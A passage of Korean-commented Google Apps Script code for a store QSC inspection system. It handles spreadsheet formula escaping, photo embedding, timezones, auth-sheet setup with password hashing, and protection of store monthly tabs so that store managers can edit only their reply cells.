     여기서 파일 끝까지를 문자열로 삼켰다). 막는 것: \u0027=작은따옴표 · \u0022=큰따옴표 · \u00A0=NBSP · \uFEFF=BOM.
     \s 가 NBSP·BOM을 이미 포함하지만, 무엇을 막는지 코드에 남기려고 함께 적는다. */
  return /^[\s\u0027\u0022\u00A0\uFEFF]*[=+\-@]|^[\t\r]/.test(v) ? "'" + v : v;
}
function safeRow(arr) { return arr.map(safe); }

/* 기능층이 ok:true 응답 '안에' 담는 오류 문구 (명세 §7-1).
   ★String(err)을 그대로 담지 말 것★ — doPost의 catch는 원문을 debug 권한자에게만 주도록
   잘 막아 두었는데, 기능층이 성공 응답 안에 담으면 그 게이트를 우회한다. 그리고 1단계에는
   토큰이 없어 그 응답이 무인증 익명 호출자에게 그대로 간다. 앱스 스크립트 예외 원문에는
   스프레드시트 파일 ID·문서명·행 번호가 실린다. 원문은 실행 로그에만 남긴다. */
/* ★문구는 '되지 않았습니다'로 적는다★ — 이 문자열은 점검자 화면에 그대로 뜬다.
   조사(이/가)가 what에 따라 갈리므로 '단계가'를 고정으로 끼워 넣는다 ('기록 단계가 …'). */
function opErr(what, err) {
  Logger.log(what + ' 되지 않음: ' + String(err));
  return what + ' 단계가 완료되지 않았습니다. 담당자에게 문의해 주세요.';
}

/* 요청한 크기가 시트 그리드를 넘으면 Apps Script는 잘라주지 않고 예외를 던진다.
   매장 월 탭은 사람이 만든 것이라 행 수가 제각각이므로, 조용히 짧게 읽는 편이 항상 낫다.
   ★전 구간에서 raw getRange 대신 이것을 쓸 것★ */
function grid(sh, row, col, nRows, nCols) {
  const r = Math.max(0, Math.min(nRows, sh.getMaxRows() - row + 1));
  const c = Math.max(0, Math.min(nCols, sh.getMaxColumns() - col + 1));
  if (r <= 0 || c <= 0) return null;
  return sh.getRange(row, col, r, c);
}

/* 여러 행을 시트 맨 아래에 붙인다.
   ★getRange()는 그리드를 넘으면 잘라주지 않고 예외를 던진다★ — insertSheet()로 만든 탭은
   1000행이고 QSC_상세는 74문항 × 26곳 = 월 1,900행이라 9월 중순에 반드시 넘는다. 그 순간
   제출이 SERVER_ERROR로 죽는데, 이미 QSC_회차 1행과 드라이브 사진 업로드는 끝난 뒤라
   점검자가 재시도하면 회차 행과 사진이 2벌씩 쌓인다. 모자라는 만큼 먼저 행을 늘린다.
   (appendRow를 행마다 부르는 방식은 74회 왕복이라 쓰지 않는다.) */
function appendRows(sh, rows) {
  if (!rows || !rows.length) return;
  const start = sh.getLastRow() + 1;
  const need = start + rows.length - 1 - sh.getMaxRows();
  if (need > 0) sh.insertRowsAfter(sh.getMaxRows(), need);
  const width = rows[0].length;
  if (sh.getMaxColumns() < width) sh.insertColumnsAfter(sh.getMaxColumns(), width - sh.getMaxColumns());
  sh.getRange(start, 1, rows.length, width).setValues(rows);
}

/* 드라이브 사진을 시트·앱에서 보여줄 수 있는 유일한 주소 형식.
   예전에 쓰던 drive.google.com/uc?export=view 는 구글이 확인 페이지로 바꿔서
   =IMAGE()에서도 <img>에서도 더 이상 그림이 뜨지 않는다. */
function photoUrl(fileId) { return 'https://lh3.googleusercontent.com/d/' + fileId + '=w800'; }
function imageFormula(fileId) {
  if (!/^[a-zA-Z0-9_-]{20,}$/.test(String(fileId))) return ''; // 서버가 수식을 만드는 유일한 지점
  return '=IMAGE("' + photoUrl(fileId) + '")';
}

/* ★셀 내 이미지로 넣는다 (2026-08-17)★ — '삽입 → 이미지 → 셀에 이미지 삽입'과 같은 형태다.
   =IMAGE() 수식과 달리 셀의 '값'이라 매장이 실수로 수식을 건드려 깨뜨릴 일이 없고,
   구글 시트 모바일 앱에서도 그대로 보인다. 매장이 앱으로 올리는 사진을 이 방식으로 통일한다.
   ★반드시 setValue로 넣어야 한다★ — setValues(2차원 배열)에 섞어 넣는 것은 문서화된 경로가
     아니다. 부르는 쪽이 빈 칸으로 한 번 쓴 뒤 사진 칸만 따로 setValue 한다.
   런타임이 newCellImage를 모르면 종전 =IMAGE() 수식으로 돌아간다 — 사진이 안 들어가는 것보다 낫다. */
function cellImageOf(fileId, alt) {
  if (!/^[a-zA-Z0-9_-]{20,}$/.test(String(fileId))) return '';
  try {
    return SpreadsheetApp.newCellImage()
      .setSourceUrl(photoUrl(fileId))
      .setAltTextTitle(String(alt || 'QSC 사진'))
      .build();
  } catch (e) {
    return imageFormula(fileId);
  }
}

/* 셀 내 이미지의 주소. ★getValues()는 이 셀을 글자가 아니라 객체로 준다★ — 그래서 문자열만
   훑던 photoIdsOf는 아무것도 못 찾았고, 매장이 시트에 '셀에 이미지 삽입'으로 넣은 사진은
   앱 화면에 한 장도 뜨지 않았다(2026-08-17 확인).
     ① 앱이 넣은 것(setSourceUrl) → getUrl()이 그 주소를 그대로 돌려준다. 파일 ID가 들어 있다
     ② 사람이 기기에서 올린 것 → getUrl()은 없고 getContentUrl()만 있다(구글이 열어 주는 주소)
   ★셀 위에 '떠 있는' 이미지는 여기서 잡히지 않는다★ — 그것은 셀의 값이 아니라 시트에 얹힌
     별개 객체(getImages())라서 이 경로로는 영영 보이지 않는다. */
function cellImageUrl(v) {
  if (!v || typeof v !== 'object') return '';
  try { if (typeof v.getUrl === 'function') { const u = v.getUrl(); if (u) return String(u); } } catch (e) { }
  try { if (typeof v.getContentUrl === 'function') { const u = v.getContentUrl(); if (u) return String(u); } } catch (e) { }
  return '';
}

/* 사진 칸 하나 → 화면에 보여줄 주소 목록. 세 가지 방식을 모두 받는다 —
   ①=IMAGE("…") 수식 ②셀에 적힌 URL 글자 ③셀 내 이미지(CellImage).
   파일 ID를 뽑을 수 있으면 photoUrl()로 표준 주소를 만들고(안정적),
   못 뽑으면(사람이 올린 셀 내 이미지) 구글이 준 주소를 그대로 쓴다. */
function photoUrlsOf(value, formulaStr) {
  const ids = photoIdsOf(value, formulaStr);
  if (ids.length) return ids.map(photoUrl);
  const u = cellImageUrl(value);
  return u ? [u] : [];
}

/* =IMAGE() 셀은 getValues()가 ''를 준다 — 이미지는 셀 값이 아니라 렌더 객체다.
   파일 ID는 수식 문자열에서 뽑아야 한다. PHOTO_EMBED=false면 셀에 URL 문자열이 들어 있으므로
   두 경로 모두 본다. 이걸 빠뜨리면 본사 개선요청 사진이 한 장도 안 뜨고, 매장이 올린 사진은
   새로고침할 때마다 사라진 것처럼 보여 드라이브에 중복 파일이 쌓인다. */
function photoIdsOf(valueStr, formulaStr) {
  /* 셀 내 이미지는 valueStr이 객체다. String()으로 찍으면 아무것도 안 나오므로
     그 주소를 먼저 꺼내 함께 훑는다 — 앱이 넣은 사진은 여기서 파일 ID가 잡힌다. */
  const src = String(formulaStr || '') + ' ' + cellImageUrl(valueStr) + ' ' +
    ((valueStr && typeof valueStr === 'object') ? '' : String(valueStr || ''));
  const out = [];
  const re = /(?:\/d\/|id=)([a-zA-Z0-9_-]{20,})/g;
  let m;
  while ((m = re.exec(src))) out.push(m[1]);
  return out;
}

/* 시트에서 읽은 값에 Date가 섞이면 JSON.stringify가 UTC로 밀어 하루가 어긋난다.
   ★프로젝트 타임존이 아니라 '스프레드시트' 타임존을 쓸 것★ — 둘은 다를 수 있다. */
function cell(v, tz) {
  if (v instanceof Date) return Utilities.formatDate(v, tz, 'yyyy-MM-dd');
  return v;
}

/* rev는 반드시 '시트에서 다시 읽은 값'으로만 계산한다.
   safe()가 붙인 아포스트로피는 저장 시엔 있고 읽을 땐 사라지므로, 쓴 값으로 계산하면
   다음 조회의 rev와 영원히 달라져 그 항목이 상시 CONFLICT가 된다.
   no를 넣으면 빈 행끼리도 구별되고, formulas를 넣으면 =IMAGE() 사진 변경이 잡힌다. */
function revOf(no, values /* J~O 6칸 */, formulas /* J~O 6칸 */) {
  const s = String(no) + '|' + values.join('') + '|' + formulas.join('');
  return sha256Hex(s).slice(0, 6);
}

function sheet(ss, name, headers) {
  let sh = ss.getSheetByName(name);
  if (!sh) { sh = ss.insertSheet(name); sh.appendRow(headers); sh.setFrozenRows(1); }
  return sh;
}

/* ★타임존 하나를 알아내려고 매번 스프레드시트를 열지 않는다★
   종전에는 curYymm()·nowIso()를 부를 때마다 openById(수백 ms)가 돌았다. 가장 어이없던 자리는
   fnAuditList — 인증 시트만 보는 함수인데 응답 `fetchedAt: nowIso()` 한 줄 때문에 응답 원본
   스프레드시트를 열었다. fnNotifyBadge는 ★배지 캐시가 히트해도★ 첫 줄 curYymm()에서 냈다.
   실행 안에서는 변수로, 실행 사이에는 캐시로 기억한다 — 시트 타임존은 몇 년에 한 번 바뀌는
   값이고, 그마저도 CACHE_EPOCH를 올리거나 6시간을 기다리면 반영된다. */
let _ssTzMemo = null;
function ssTz() {
  if (_ssTzMemo) return _ssTzMemo;
  _ssTzMemo = tzMemo('sstz', SPREADSHEET_ID);
  return _ssTzMemo;
}

/* 매장 파일 26개의 타임존. ★getSpreadsheetTimeZone()이 문자열을 안 줄 수 있다★
   2026-08-16 실제 사고: 금종제과 파일에 '이름 있는 시간대'(Asia/Seoul)가 지정돼 있지 않아
   이 값이 문자열로 오지 않았고, 그대로 Utilities.formatDate에 넘어가
   "잘못된 인수(timeZone)입니다. String 형식이어야 합니다."로 죽었다. 그 예외는 doPost의
   catch에 잡혀 매장 화면에는 "처리 중 문제가 생겼습니다"로만 보였다 — 매장현황이 한 번도
   열리지 않았는데 원인을 화면에서는 알 방법이 없었다.
   ★ssTz·authTz는 처음부터 같은 폴백을 갖고 있었다★ — 26개 매장 파일만 맨몸이었고,
   하필 그 파일들만 본사가 만든 것이 아니라 수년간 사람 손으로 복제돼 온 것들이다.
   시트 쪽에서 시간대를 지정해도 되지만, 새로 늘어나는 파일마다 다시 챙겨야 하므로
   받는 쪽에서 막는다. */
function fileTz(ss) {
  let tz = null;
  try { tz = ss.getSpreadsheetTimeZone(); } catch (e) { }
  return (typeof tz === 'string' && tz) ? tz : Session.getScriptTimeZone();
}

function tzMemo(name, fileId) {
  const key = 'tz:v' + epoch() + ':' + name;
  try {
    const cache = CacheService.getScriptCache();
    const hit = cache.get(key);
    if (hit) return hit;
    const tz = SpreadsheetApp.openById(fileId).getSpreadsheetTimeZone();
    if (tz) { cache.put(key, tz, 21600); return tz; }
  } catch (e) { }
  return Session.getScriptTimeZone();
}

/* 시각은 스프레드시트 타임존으로 낸다 — toISOString()(UTC)을 쓰면 매달 1~10일 경계에서 하루 어긋난다. */
function nowIso() {
  try {
    return Utilities.formatDate(new Date(), ssTz(), "yyyy-MM-dd'T'HH:mm:ssXXX");
  } catch (e) { return new Date().toISOString(); }
}

function pad2(n) { return (n < 10 ? '0' : '') + n; }
function round1(n) { return Math.round(n * 10) / 10; }

function json(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj)).setMimeType(ContentService.MimeType.JSON);
}


/* ══════════════════════════════════════════════════════════════
   처음 한 번만 — 설치 절차 전체.
   편집기에서 이 함수 하나만 골라 [실행]하면 끝난다.

   함수를 여러 개로 나눠 두면 실제로 가장 잘 어긋난다 — 고르는 것을 잊거나,
   순서를 바꾸거나, 중간 로그를 못 보고 지나간다. 그래서 하나로 묶어 두었다.

   ★두 번 눌러도 안전하다★ 이미 만들어진 것은 다시 만들지 않고,
     비밀값(TOKEN_KEY·PW_PEPPER)도 절대 덮어쓰지 않는다.
     (덮어쓰면 그 순간 전 계정의 비밀번호 해시가 맞지 않게 되고 모든 토큰이 죽는다.)
     단 관리자 설정코드는 누를 때마다 새로 나오고 직전 코드는 무효가 된다.
   ══════════════════════════════════════════════════════════════ */
function setupAuthSheet_once() {
  const out = [];

  // ① 인증 스프레드시트 — 드라이브에서 만들고 주소를 복사해 붙여넣는 절차가 번번이 어긋나서 코드로 끝낸다
  let id = prop('AUTH_SHEET_ID', '');
  let made = false;
  if (!id) {
    id = SpreadsheetApp.create('QSC 인증').getId();
    PROPS.setProperty('AUTH_SHEET_ID', id);
    made = true;
  }
  out.push('① 인증 시트  AUTH_SHEET_ID = ' + id + (made ? '  (새로 만듦)' : '  (이미 있던 것)'));

  // ② 비밀값 — 사람이 "qsc2026!" 같은 값을 넣으면 서명과 페퍼가 통째로 무의미해진다
  out.push('② ' + initSecrets());

  // ③ 탭 준비 (계정·역할·감사로그·매장파일맵)
  const ens = ensureAuthSheets();
  out.push('③ 탭 준비  ' + JSON.stringify(ens));

  /* ④ 비밀번호 해시 반복수.
     250ms를 넘기면 요청 1건으로 서버 시간을 태우는 증폭 공격이 되고, 너무 낮으면 해시가 헐거워진다.
     이 PC가 아니라 앱스 스크립트 서버에서 실제로 재 본 값을 쓴다. */
  if (!prop('PW_ITER', '')) {
    let best = 1000;
    [1000, 5000, 10000, 20000].forEach(function (n) {
      const t0 = Date.now();
      pwHash('bench-salt-0000', 'benchmark-password', n);
      if (Date.now() - t0 <= 250) best = n;
    });
    PROPS.setProperty('PW_ITER', String(best));
    out.push('④ PW_ITER = ' + best + '  (250ms 이내 최대값으로 자동 측정)');
  } else {
    out.push('④ PW_ITER = ' + prop('PW_ITER', '') + '  (이미 설정됨)');
  }

  // ⑤ 매장 계정 — 통합시트 매장명을 그대로 아이디로. '사용 · 비밀번호 미설정' 상태로 생성된다
  const sync = syncStoreAccountsCore();
  out.push('⑤ 매장 계정  새로 ' + (sync.added || []).length + '개 · 건너뜀 ' +
    (sync.skipped || []).length + '개' + (sync.error ? '  ⚠' + sync.error : ''));

  out.push('');
  out.push('══ 다음은 사람이 합니다 ══');
  out.push('1) 관리자 비밀번호 설정코드 (24시간 유효): ' + issueAdminSetupCode('admin'));
  out.push('   → login.html 에서 아이디 admin + 이 코드를 넣고 비밀번호를 정하십시오.');
  out.push('2) 로그인한 뒤 accounts.html 에서 매장별 비밀번호를 설정해 전달하십시오.');
  out.push('');
  out.push('★배포 당일만★ 스크립트 속성 HASH_BUDGET 을 1000 으로 올려 두고 다음 날 300 으로');
  out.push('  되돌리십시오. 26곳 비밀번호 설정 + 그날 저녁 첫 로그인 + 오타 재시도가 하루에');
  out.push('  몰리는데, 한도에 닿으면 "받은 비밀번호로 안 들어가진다"로만 보이고 원인이 안 뜹니다.');

  const msg = out.join(String.fromCharCode(10));
  Logger.log(msg);
  return msg;
}

// 이름이 기억나지 않을 때를 위한 별칭. 하는 일은 위와 같다.
function setupAll_once() { return setupAuthSheet_once(); }

/* ══════════════════════════════════════════════════════════════
   매장 시트 사본 테스트 — 원본은 열지도 쓰지도 않는다.

   ★안전장치 3겹★
     ① 사본은 이 함수가 직접 만든다(makeCopy). 원본 ID는 '복사할 원본'으로만 쓰인다
     ② 쓰기 대상 파일 이름에 '_연동테스트'가 없으면 즉시 중단한다
     ③ 통합시트·storeFileId를 한 번도 부르지 않는다. 실매장 파일에 닿을 경로가 없다

   무엇을 보는가 (10/1 전에 확인해야 하는 것들):
     1) 없는 월 탭이 자동으로 생기는가
     2) 그때 D:I 병합과 K열 드롭다운이 살아남는가 (clear()였다면 날아간다)
     3) 개선율 같은 수식이 새 탭에서도 계산되는가
     4) 본사 기록이 B·C·D·J만 쓰고 매장 몫 K~O를 건드리지 않는가
     5) 보호 설정이 복제돼 매장이 저장하지 못하게 되지는 않는가
   ══════════════════════════════════════════════════════════════ */
/* ---------- 매장 월 탭 보호 (2026-08-18) ----------

   ★목표★ 점장이 시트를 직접 열어도 '개선요청에 대한 답변'만 쓸 수 있게 한다.
     매장 몫 = K~P (담당부서·담당자·예정일/진행·완료일/완료·개선 후 사진·비고), 12행부터
     본사 몫 = 그 밖 전부 — 2~9행 요약(점수·등급·개선율) · 11행 머리글 · B·C·D·J · 차기 월 목표

   ★반드시 스크립트 계정을 편집자로 남긴다★ — 빠뜨리면 10/1에 STORE_FILE_WRITE를 켰을 때
     게이트·락·검증을 다 통과한 뒤 마지막 setValues 한 줄에서 죽는다. 화면에는 원인 불명의
     오류로만 보인다. auditStoreFiles의 ⑧ 항목이 이것을 확인하는 자리다.

   ★11행을 보호에 포함한다★ (사용자 요청) — 머리글이 바뀌면 writeStoreQscInto가 'NO.'를 못 찾아
     그 매장만 기록이 통째로 멈춘다.

   보호는 '시트 전체 보호 + K12:P 예외' 방식이다. 열 단위로 하나씩 거는 것보다 빠지는 칸이 없다. */

/* ★한 월 탭에서 '매장이 쓰는 칸'이 어디인지 시트에게 물어본다★

   열 번호를 코드에 박지 않는다. 실물 파일 ★한 개 안에 서식이 두 가지★이기 때문이다:
     · 현행 (2605~)      머리글 11행 · 본문 12행~ · 매장 몫 K(담당부서)~P(비고)
     · 구서식 (2601~2604) 머리글 9행(9:10 병합) · 본문 11행~ · 매장 몫 F(담당부서)~M(비고)

   K12:P 를 고정으로 열어 주면 구서식 탭에서는 ★점장이 자기 칸을 못 쓰고, 대신 표 밖이 열린다★.
   그래서 머리글 줄에서 '담당부서'와 '비고'를 찾아 그 사이를 매장 몫으로 잡는다.
   본문 시작은 머리글 셀의 병합이 끝난 다음 줄이다(구서식은 9:10 병합이라 11행부터).

   ★못 알아보면 열지 않는다★ — 자리를 모르는 채로 넉넉히 열면 요약·산식·차기 월 목표까지 열린다.
   그럴 바에는 그 탭을 건너뛰고 사람에게 알리는 편이 낫다. */
function storeCellsIn(sh) {
  const NG = function (v) { return String(v == null ? '' : v).replace(/\s+/g, ''); };
  let vals = [];
  try { vals = sh.getRange(1, 1, Math.min(15, sh.getMaxRows()), sh.getMaxColumns()).getValues(); }
  catch (e) { return { ok: false, why: '머리글을 읽지 못했습니다(' + String(e).slice(0, 40) + ')' }; }

  let hr = 0, hc = 0, lc = 0;
  for (let r = 0; r < vals.length && !hr; r++) {
    for (let c = 0; c < vals[r].length; c++) {
      if (NG(vals[r][c]) === '담당부서') { hr = r + 1; hc = c + 1; break; }
    }
  }
  if (!hr) return { ok: false, why: "머리글에서 '담당부서'를 찾지 못했습니다" };

  for (let c = hc; c < vals[hr - 1].length; c++) {
    if (NG(vals[hr - 1][c]) === '비고') { lc = c + 1; break; }
  }
  if (!lc) return { ok: false, why: "머리글에서 '비고'를 찾지 못했습니다 (담당부서는 " + hc + '열)' };
  if (lc <= hc) return { ok: false, why: "'비고'가 '담당부서'보다 왼쪽입니다" };

  /* 본문 첫 줄 — 머리글 셀이 세로로 병합돼 있으면 그 끝 다음 줄이다 */
  let row0 = hr + 1;
  try {
    const mrs = sh.getRange(hr, hc, 1, 1).getMergedRanges();
    if (mrs.length) row0 = mrs[0].getRow() + mrs[0].getNumRows();
  } catch (e) { /* 병합을 못 읽으면 머리글 바로 다음 줄로 본다 */ }

  /* 표 끝 — 요약의 =COUNTA(...) 가 알고 있다. ★못 읽으면 열지 않는다★
     (종전에는 getMaxRows()로 벌려서 표 아래 이월 메모와 우측 '차기 월 목표'까지 열렸다) */
  const endRow = tableEndRow(sh);
  if (!endRow) return { ok: false, why: '표 끝을 못 읽었습니다 (요약의 COUNTA 수식 확인 필요)' };
  if (endRow < row0) return { ok: false, why: '표 끝(' + endRow + ')이 본문 시작(' + row0 + ')보다 앞입니다' };

  return {
    ok: true, row0: row0, col0: hc, cols: lc - hc + 1, endRow: endRow,
    a1: sh.getRange(row0, hc, endRow - row0 + 1, lc - hc + 1).getA1Notation(),
  };
}

/* 한 탭의 보호를 전부 지운다. ★SHEET·RANGE 둘 다★ — 사람 손으로 걸린 옛 RANGE 보호가 남으면
   "걸었다는데 점장이 여전히 못 쓴다"가 된다. 지운 것의 설명을 돌려주어 로그에 남긴다.
   못 지운 것이 하나라도 있으면 그 사실을 숨기지 않는다(부르는 쪽이 ✗로 처리한다). */
function clearProtections(sh) {
  const TYPES = [SpreadsheetApp.ProtectionType.SHEET, SpreadsheetApp.ProtectionType.RANGE];
  let gone = 0, left = 0;
  const desc = [];
  TYPES.forEach(function (t) {
    let list = [];
    try { list = sh.getProtections(t); } catch (e) { return; }
    list.forEach(function (x) {
      let d = '';
      try { d = String(x.getDescription() || '').trim(); } catch (e) { }
      try { x.remove(); gone++; if (d) desc.push(d); } catch (e) { left++; }
    });
  });
  return { gone: gone, left: left, desc: desc };
}

/* ---------- 매장 월 탭 보호 ----------

   ★목표★ 점장이 시트를 직접 열어도 '개선요청에 대한 답변'만 쓸 수 있게 한다.
     매장 몫 = 담당부서~비고, 본문 줄만  ·  본사 몫 = 그 밖 전부(요약·머리글·개선요청 본문·차기 월 목표)

   ★반드시 스크립트 계정을 편집자로 남긴다★ — 빠뜨리면 10/1에 STORE_FILE_WRITE를 켰을 때
     게이트·락·검증을 다 통과한 뒤 마지막 setValues 한 줄에서 죽는다.

   ★찍은 ✓는 전부 '다시 읽어서 확인한' 것이다★ (2026-08-20)
     종전의 '스크립트 편집가능=true'는 방금 자기가 만든 보호에게 물은 것이라 늘 참이었다.
     지금은 보호를 건 뒤 시트에서 ①보호 개수 ②열린 범위 ③스크립트 편집 가능 여부를
     ★다시 읽어★ 기대와 맞는지 대조한다. 하나라도 어긋나면 ✗다. */
function protectMonthTabsIn(ss) {
  const me = (function () { try { return Session.getEffectiveUser().getEmail(); } catch (e) { return ''; } })();
  const out = [];
  const tabs = monthTabs(ss);
  for (let i = 0; i < tabs.length; i++) {
    const tab = tabs[i];
    const sh = ss.getSheetByName(tab);
    if (!sh) continue;

    /* ① 자리부터 알아낸다. 모르면 ★아무것도 건드리지 않고★ 넘어간다 —
          보호를 먼저 지웠다가 실패하면 그 탭이 무방비로 남는다(지적 17·18). */
    const box = storeCellsIn(sh);
    if (!box.ok) { out.push('✗ ' + tab + ' : ' + box.why + ' — 손대지 않았습니다'); continue; }

    /* ② 옛 보호 정리. 못 지운 것이 있으면 새로 걸지 않는다 —
          걸어 봐야 그 옛 보호가 점장을 계속 막는다(지적 2·13·14). */
    const cl = clearProtections(sh);
    if (cl.left) {
      out.push('✗ ' + tab + ' : 못 지운 보호 ' + cl.left + '건 — 이 탭은 시트에서 직접 풀어야 합니다' +
        (cl.desc.length ? ' [지운 것: ' + cl.desc.join(' / ') + ']' : ''));
      continue;
    }

    let pr = null;
    try {
      pr = sh.protect().setDescription('QSC — 매장은 답변 칸만 편집 (' + box.a1 + ')');
      pr.setUnprotectedRanges([sh.getRange(box.row0, box.col0, box.endRow - box.row0 + 1, box.cols)]);
      try { pr.setWarningOnly(false); } catch (e) { }
      try { pr.setDomainEdit(false); } catch (e) { /* 도메인 공유 파일이 아닐 때 던진다 */ }
      if (me) { try { pr.addEditor(me); } catch (e) { } }
      try {
        const others = pr.getEditors().map(function (u) { return u.getEmail(); })
          .filter(function (e) { return e && e !== me; });
        if (others.length) pr.removeEditors(others);
      } catch (e) { /* 소유자는 제거되지 않는다 — 무시 */ }
    } catch (e) {
      /* ★반쯤 걸린 보호는 반드시 되돌린다★ — 그대로 두면 그 탭은 답변 칸까지 전면 잠긴다(지적 4) */
      if (pr) { try { pr.remove(); } catch (e2) { } }
      out.push('✗ ' + tab + ' : ' + String(e).slice(0, 80) + ' — 건 보호는 되돌렸습니다');
      continue;
    }

    /* ③ ★다시 읽어서 확인한다★ (지적 2·3·7·8) */
    const v = (function () {
      try {
        const sp = sh.getProtections(SpreadsheetApp.ProtectionType.SHEET);
        const rp = sh.getProtections(SpreadsheetApp.ProtectionType.RANGE);
        if (sp.length !== 1) return '시트 보호가 ' + sp.length + '건 (1건이어야 합니다)';
        if (rp.length) return '범위 보호가 ' + rp.length + '건 남아 있습니다';
        const open = sp[0].getUnprotectedRanges().map(function (r) { return r.getA1Notation(); });
        if (open.length !== 1 || open[0] !== box.a1) {
          return '열린 칸이 ' + (open.join(',') || '없음') + ' — ' + box.a1 + ' 이어야 합니다';
        }
        if (!sp[0].canEdit()) return '스크립트 계정이 이 보호를 편집할 수 없습니다';
        return '';
      } catch (e) { return '확인 중 오류: ' + String(e).slice(0, 50); }
    })();

    if (v) {
      out.push('✗ ' + tab + ' : ' + v);
    } else {
      out.push('✓ ' + tab + ' : 답변 칸 ' + box.a1 + ' 만 열림 (확인함)' +
        (cl.gone ? ' · 옛 보호 ' + cl.gone + '건 지움' +
          (cl.desc.length ? ' [' + cl.desc.join(' / ') + ']' : '') : ''));
    }
  }
  return out;
}

/* ★사본에만 건다★ — 인자 없이 실행할 수 있게 만든 검증용. 편집기에서 이것부터 돌릴 것.
   이름에 _연동테스트가 없으면 즉시 중단한다(원본 보호). */
function testStoreProtect() {
  const id = prop('TEST_STORE_ID', '');
  if (!id) { const m = '★중단★ TEST_STORE_ID가 없습니다. 먼저 testStoreCopy()를 실행하십시오.'; Logger.log(m); return m; }
  const ss = SpreadsheetApp.openById(id);
  if (ss.getName().indexOf('_연동테스트') < 0) {
    const m = '★중단★ 대상 파일 이름에 _연동테스트가 없습니다: ' + ss.getName();
    Logger.log(m); return m;
  }
  const out = ['=== 사본 월 탭 보호 ===', '대상: ' + ss.getName()];
  out.push.apply(out, protectMonthTabsIn(ss));
  out.push('');
  out.push('▶ 이제 점장 입장에서 확인하십시오 —');
  out.push('   ① K~P(담당부서~비고)에 글자가 써져야 한다');
  out.push('   ② J열(개선요청사항)·11행 머리글·2~9행 요약은 막혀야 한다');
  const msg = out.join('\n');
  Logger.log(msg);
  return msg;
}

/* 실전 26곳. ★사본으로 먼저 확인한 뒤에 돌릴 것★. 10곳씩 끊어 돈다(auditStoreFiles와 같은 방식).

   ★한 곳 끝날 때마다 로그를 찍고 진행 상황을 속성에 남긴다★ (2026-08-20)
     종전에는 Logger.log가 맨 끝 한 번뿐이었다. 앱스 스크립트는 6분에서 실행을 끊는데,
     그때 반환값도 로그도 없이 사라지므로 ★어디까지 걸었는지 알 방법이 전혀 없었다★.
     26곳 × 9~10탭이면 6분은 넉넉하지 않다. 끊긴 뒤에는 `protectProgress()` 로 확인한다. */
function protectStoreTabs(stores, page) {
  const sel = pickPage(stores, page);
  const t0 = Date.now();
  const out = ['=== 매장 월 탭 보호 ' + (sel.page + 1) + '쪽 · ' + sel.list.length + '곳 (전체 ' + sel.total + '곳) ==='];
  const done = [], bad = [];

  const stamp = function (store, note) {
    try {
      PROPS.setProperty('PROTECT_PROGRESS', JSON.stringify({
        page: sel.page, total: sel.total, done: done.length, bad: bad.length,
        last: store, note: note || '', sec: Math.round((Date.now() - t0) / 1000),
      }));
    } catch (e) { /* 진행 기록 실패가 본 작업을 막을 이유는 없다 */ }
  };

  for (let i = 0; i < sel.list.length; i++) {
    const store = sel.list[i];
    const head = '── ' + store + ' (' + (i + 1) + '/' + sel.list.length + ') ──';
    const lines = [];
    try {
      const id = storeFileId(store);
      if (!id) {
        lines.push('✗ 파일 ID 없음');
      } else {
        lines.push.apply(lines, protectMonthTabsIn(SpreadsheetApp.openById(id)));
      }
    } catch (e) { lines.push('✗ ' + String(e).slice(0, 90)); }

    const failed = lines.some(function (l) { return l.charAt(0) === '✗'; });
    (failed ? bad : done).push(store);
    out.push('', head);
    out.push.apply(out, lines);

    /* ★한 곳마다 찍는다★ — 다음 매장에서 6분에 걸려 죽어도 여기까지는 로그에 남는다 */
    Logger.log(head + '\n' + lines.join('\n'));
    stamp(store, failed ? '실패' : '성공');

    /* 남은 시간이 한 매장 몫도 안 되면 스스로 멈춘다 — 반쯤 걸다 끊기는 것보다 낫다 */
    if (Date.now() - t0 > 4.5 * 60 * 1000 && i + 1 < sel.list.length) {
      out.push('', '★시간이 부족해 ' + (i + 1) + '곳에서 멈췄습니다★ (6분 한도)');
      out.push('   남은 곳: ' + sel.list.slice(i + 1).join(', '));
      out.push('   이어서: protectStoreTabs(' + JSON.stringify(sel.list.slice(i + 1)) + ')');
      break;
    }
  }

  out.push('');
  out.push('성공 ' + done.length + '곳 · 실패 ' + bad.length + '곳' +
    (bad.length ? ' — ★' + bad.join(', ') + '★' : ''));
  if (bad.length) {
    out.push('  실패한 곳은 위 로그에서 ✗ 줄을 보십시오. 되돌리려면 unprotectStoreTabs([\'매장명\'])');
  }
  out.push(sel.left ? '★ ' + sel.left + '곳 남음 — 다음: protectStoreTabs(null, ' + (sel.page + 1) + ')'
                    : '✓ 이 쪽은 끝났습니다.');
  const msg = out.join('\n');
  Logger.log(msg);
  return msg;
}

/* 6분에 걸려 끊겼을 때 어디까지 갔는지 본다. 인자 없이 실행. */
function protectProgress() {
  const raw = prop('PROTECT_PROGRESS', '');
  const m = raw ? ('마지막 기록: ' + raw) : '기록이 없습니다 (아직 한 번도 안 돌렸거나 속성이 지워졌습니다)';
  Logger.log(m);
  return m;
}

/* ── 보호 되돌리기 (2026-08-18) ──────────────────────────────
   ★거는 함수를 만들면서 푸는 함수를 같이 만들지 않으면 되돌릴 수 없는 변경이 된다.★
   점장이 "못 쓰겠다"고 연락해 왔을 때 26곳 × 9~10탭을 손으로 푸는 것은 현실적이지 않다.

   ★SHEET·RANGE 두 종류를 모두 지운다★ — 거는 쪽은 SHEET만 다루지만 푸는 쪽까지 좁게
     만들면, 사람 손으로 걸린 옛 보호가 남아 "풀었다는데 여전히 안 써진다"가 된다.
   ★지운 보호의 설명을 로그에 남긴다★ — 원래 있던 보호를 지웠다면 그 사실이 어딘가에
     남아야 나중에 되살릴 수 있다. */

function unprotectMonthTabsIn(ss) {
  const out = [];
  const tabs = monthTabs(ss);
  const TYPES = [SpreadsheetApp.ProtectionType.SHEET, SpreadsheetApp.ProtectionType.RANGE];
  for (let i = 0; i < tabs.length; i++) {
    const sh = ss.getSheetByName(tabs[i]);
    if (!sh) continue;
    let gone = 0, left = 0;
    const desc = [];
    TYPES.forEach(function (t) {
      let list = [];
      try { list = sh.getProtections(t); } catch (e) { return; }
      list.forEach(function (x) {
        let d = '';
        try { d = String(x.getDescription() || '').trim(); } catch (e) { }
        try { x.remove(); gone++; if (d) desc.push(d); } catch (e) { left++; }
      });
    });
    out.push((left ? '✗ ' : '✓ ') + tabs[i] + ' : 푼 보호 ' + gone + '건' +
      (desc.length ? ' [' + desc.join(' / ') + ']' : '') +
